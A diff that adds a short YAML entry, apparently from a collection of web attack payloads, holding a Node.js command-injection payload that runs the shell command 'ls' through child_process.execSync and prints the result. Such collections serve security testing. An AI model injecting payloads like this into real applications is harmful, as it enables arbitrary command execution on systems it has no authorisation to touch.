@@ -1,0 +1,8 @@
+metadata:
+  filename: "nodejs-command-injection-console.yaml"
+  tags: ["web"]
+  created: "2025-03-29"
+  author: "@anakles"
+
+content: |
+  console.log(require("child_process").execSync("ls").toString());
